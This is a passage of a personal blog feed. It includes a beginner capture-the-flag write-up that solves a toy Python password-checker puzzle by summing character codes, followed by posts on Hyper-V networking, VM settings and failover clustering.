+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;correct&quot;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;incorrect&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;There are a few things in here that can be just thrown to the side because it won’t make a difference to the mission. It’s just house keeping. Afterwards you have just this.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;83&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;correct&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are parts to this that if you haven’t seen you may need to do a quick googles. 
+Those things are&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;ord()&lt;/li&gt;
+  &lt;li&gt;len()&lt;/li&gt;
+  &lt;li&gt;and the password[1] part.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;basically 
+ord() is the oppsite of chr()
+ord takes a character and gives the unicode of the character. 
+ie&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; ord('c')
+99
+&amp;gt;&amp;gt;&amp;gt; ord('a')
+97
+&amp;gt;&amp;gt;&amp;gt; chr(97)
+'a'
+&amp;gt;&amp;gt;&amp;gt; chr(99)
+'c'
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;so to figure out 
+&lt;code&gt; ord(password[1]) == 83: &lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Open up terminal and run 
+&lt;code&gt;python&lt;/code&gt;
+&lt;code&gt; chr(83) &lt;/code&gt;
+to get the character&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; chr(83)
+'S'
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;len() takes a string and counts the length.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;len('cat')
+&amp;gt;&amp;gt;&amp;gt; 3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and then the password[1] part. That’s happening because the password string is being iterated through each character. so the [1] spot is what it’s looking at. Remember that means the second spot because [0] is the first.&lt;/p&gt;
+
+&lt;p&gt;so we can sort of sudocode out what we need…&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting at the first letter
+Builder starts at 0
+  for the current letter we are looking at in password do this and loop: 
+    add the value of the letter to a thing called builder.
+    
+    if builder's total hits 1000
+    and the total length of the password is 10
+    and the second letter of the string is 'S'
+      print &quot;correct&quot;
+    else
+    you got it wrong
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I decided to write a modified version of the code to double check&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then ran it with the same letter 3 times.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test.py aaa
+97
+194
+291
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Edited the test python to print the ord and the builder values through the characters&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Invalid args&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Builder ='&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builder&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-----'&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Ord ='&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'-----'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and output was beautifully&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test2.py aaa
+Builder =
+97
+-----
+Ord =
+97
+-----
+Builder =
+194
+-----
+Ord =
+97
+-----
+Builder =
+291
+-----
+Ord =
+97
+-----
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Added a print of length by throwing this into the for loop&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;print len(password)
+print '-----'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I came up with a random password that seemed to satisfy the conditions.&lt;/p&gt;
+
+&lt;p&gt;I picked tSaaxaacaa. Not sure why. Ran it in our program.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python Python1-test4.py tSaaxaacaa
+Builder =
+116
+-----
+Ord =
+116
+-----
+10
+-----
+Builder =
+199
+-----
+Ord =
+83
+-----
+10
+-----
+Builder =
+296
+-----
+Ord =
+97
+-----
+10
+-----
+Builder =
+393
+-----
+Ord =
+97
+-----
+10
+-----
+Builder =
+513
+-----
+Ord =
+120
+-----
+10
+-----
+Builder =
+610
+-----
+Ord =
+97
+-----
+10
+-----
+Builder =
+707
+-----
+Ord =
+97
+-----
+10
+-----
+Builder =
+806
+-----
+Ord =
+99
+-----
+10
+-----
+Builder =
+903
+-----
+Ord =
+97
+-----
+10
+-----
+Builder =
+1000
+-----
+Ord =
+97
+-----
+10
+-----
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;It seemed to meet the conditions. Len was 10. The second character ord was 83 and we hit our goal of 1000.&lt;/p&gt;
+
+&lt;p&gt;Run it in the PYTHON1.py program annnndddd.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@KaliOnWindows:~/Downloads# python PYTHON1.py tSaaxaacaa
+correct
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Okay Done and Done. This took a little bit of time to run through but it was worth 150 points. Whew.&lt;/p&gt;
+
+&lt;p&gt;Cheers,&lt;/p&gt;
+
+&lt;p&gt;Zack&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="InfoSec" /><summary type="html">NCL Gym 2018 - Enumeration and Exploitation Python 1</summary></entry><entry><title type="html">Configuring Hyper V Networking</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html" rel="alternate" type="text/html" title="Configuring Hyper V Networking" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Hyper-V-Networking.html">&lt;p&gt;Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.&lt;/p&gt;
+
+&lt;h3 id=&quot;basic-hyper-v-networking&quot;&gt;Basic Hyper-V Networking&lt;/h3&gt;
+
+&lt;p&gt;There are a couple of places you can Management parts of the virtual network. First, you will want to go to the Virtual Switch Settings in Hyper-V to be able to do basic switch configuration.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;In Hyper-V Manager, go to the actions bar and select the Hyper-V Switch Manager&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/hyperVN/1.PNG&quot; alt=&quot;HyperV Actions&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;In the switch manager, you should see any switches you’ve created, as well as the default switch. 
+&lt;img src=&quot;/assets/img/servergifs/hyperVN/2.PNG&quot; alt=&quot;HyperV&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;here you can configure your switch to be external, internal, or private. As explained in another post…&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;Private&lt;/em&gt; - isolation from the rest of the network, VMs on the same host can connect together with this setting. 
+&lt;em&gt;Internal&lt;/em&gt; - Same as Private but can also communicate with the host as well.
+&lt;em&gt;External&lt;/em&gt; - Faces the network like a physical machine.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Machines that are on Private or Internal networks will usually have to have their IP addresses set unless there is a DHCP server on a VM or on the host machine.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;If you’ve set up the switch as external, you will need to link it to an external switch if you’d like to allow it to get to the outside network or internet.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Once you’ve setup the switches, you should be able to access them to change their IP addresses and adjust some of their settings in your local machines network adapter list.&lt;br /&gt;
+&lt;img src=&quot;/assets/img/servergifs/hyperVN/3.PNG&quot; alt=&quot;Network Adapters&quot; /&gt;&lt;br /&gt;
+As you can see, there is a default switch, A switch with a custom name. And then individual switches most likely used as external switches for single VMs.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;changing-a-vms-switch&quot;&gt;Changing a VMs Switch&lt;/h3&gt;
+
+&lt;p&gt;Changing the Virtual Switch you use can be handled in the VMs settings.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Head to the vm settings for the specific VM you’re working on within Hyper-V Manager&lt;/li&gt;
+  &lt;li&gt;Under hardware there will be a Legacy Network Adapter section. Go there.&lt;/li&gt;
+  &lt;li&gt;There you will see a drop down for the Vritual Switch you’d like to use. 
+&lt;img src=&quot;/assets/img/servergifs/hypervSet/4.PNG&quot; alt=&quot;Selecting switch&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Once you’ve changed the settings you can apply the settings and quit out.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;nic-teaming&quot;&gt;NIC Teaming&lt;/h3&gt;
+&lt;p&gt;Under the Legacy Network Adapter option in the Hyper-V Settings, you will see the dropdown for Advanced Features. Here you can add a handful of advanced features, one including NIC teaming. Select this if you want a NIC to be allow to be part of NIC teaming.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hyperVN/4.PNG&quot; alt=&quot;Nic Teaming&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;That’s the basics!&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Hyper-V has extensive software defined network capabilities allowing an admin to create elaboriate networking, isolating host VMs, Vlans, Link Aggregation, and Load Balancing.</summary></entry><entry><title type="html">Configuring Virtual Machine Settings</title><link href="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html" rel="alternate" type="text/html" title="Configuring Virtual Machine Settings" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Configuring-Virtual-Machine-Settings.html">&lt;h2 id=&quot;setting-hyper-v-settings&quot;&gt;Setting Hyper-V settings&lt;/h2&gt;
+
+&lt;p&gt;Hyper-V settings can be adjusted for each VM and will in essence adjust the aspects of the VM that would usually be physical components.&lt;/p&gt;
+
+&lt;h3 id=&quot;hardware-options&quot;&gt;Hardware Options&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/1.png&quot; alt=&quot;Hyper V Settings&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hyper-V settings feels similar to Device Manager and can be used to:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Set which harddrive VHD to use and adjust VHD settings&lt;/li&gt;
+  &lt;li&gt;Set which NICs/ Virtual Switches to use
+&lt;img src=&quot;/assets/img/servergifs/hypervSet/4.PNG&quot; alt=&quot;Network Switches&quot; /&gt;&lt;/li&gt;
+  &lt;li&gt;Adjust available RAM&lt;/li&gt;
+  &lt;li&gt;adjust the processor useage allocation&lt;/li&gt;
+  &lt;li&gt;‘load’ a disk into the virtual disk drive
+&lt;img src=&quot;/assets/img/servergifs/hypervSet/3.PNG&quot; alt=&quot;hyperv using an iso&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;These settings sometimes can only be adjusted when the machine is turned off, but for some settings can be adjusted as the machine is running. For example loading a local .iso as a Disk in the virtual Disk drive&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;management-options&quot;&gt;Management Options&lt;/h3&gt;
+
+&lt;p&gt;You will also notice a section near the bottom of the left hand side that is called Managment. Here is a Hyper-V specific set of options for managing Hyper-V such as:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;using a VM Heartbeat&lt;/li&gt;
+  &lt;li&gt;Renaming the VM&lt;/li&gt;
+  &lt;li&gt;Creating checkpoints and it’s file location&lt;/li&gt;
+  &lt;li&gt;Automatic start and stop of VM&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/servergifs/hypervSet/2.PNG&quot; alt=&quot;Management Options&quot; /&gt;&lt;/p&gt;</content><author><name>Zack Jones</name></author><category term="Server" /><summary type="html">Setting Hyper-V settings</summary></entry><entry><title type="html">Implementing Failover Clustering</title><link href="http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering.html" rel="alternate" type="text/html" title="Implementing Failover Clustering" /><published>2018-03-28T22:54:00-04:00</published><updated>2018-03-28T22:54:00-04:00</updated><id>http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering</id><content type="html" xml:base="http://localhost:4000/server/2018/03/28/Implementing-Failover-Clustering.html">&lt;h3 id=&quot;installing-the-failover-feature&quot;&gt;Installing the Failover Feature&lt;/h3&gt;
+&lt;p&gt;To add this feature, in Server Manager go to Manage and Add Roles and Features. From the Features list select &lt;em&gt;Failover Clustering&lt;/em&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;validate-cluster-configuration&quot;&gt;Validate Cluster Configuration&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Go to Failover Clustering in the tools of Server Manager,&lt;/li&gt;
+  &lt;li&gt;on the right side there will be a Actions panel where you can select &lt;em&gt;Validate Configuration&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;Add the names of the servers in the text boxes and continue&lt;/li&gt;
+  &lt;li&gt;then &lt;strong&gt;Run all Tests&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;This will check to make sure the inventory, the stroage, the system configs, and Hyper-V is setup and ready for Clustering. Errors will show up in the &lt;strong&gt;Failover Cluster Report&lt;/strong&gt;&lt;br /&gt;
+If there are any issues, use the report to help you sovle them before moving forward.&lt;/p&gt;
+
+&lt;h3 id=&quot;creating-a-cluster&quot;&gt;Creating a Cluster&lt;/h3&gt;
